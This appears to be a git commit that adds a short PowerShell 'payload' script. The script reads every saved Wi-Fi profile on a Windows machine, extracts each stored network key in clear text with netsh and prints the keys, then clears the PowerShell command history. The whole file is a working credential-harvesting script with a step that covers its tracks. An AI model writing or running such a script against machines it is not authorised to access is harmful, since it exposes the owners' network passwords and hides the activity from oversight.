1a7bf12e19bb3d3af60c7cc2572551bc6017e020
LahevOdVika <75607884+LahevOdVika@users.noreply.github.com>
2024-11-19 17:41:05 +0100

    Adding safe password payload

---
+++ Windows-Passwords.ps1
@@ -0,0 +1,13 @@
+
+# ENG
+netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
+    $wlan  = $_.Matches.Value
+    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
+
+	
+	Write-Output $passw
+
+}
+
+# Clear the PowerShell command history
+Clear-History
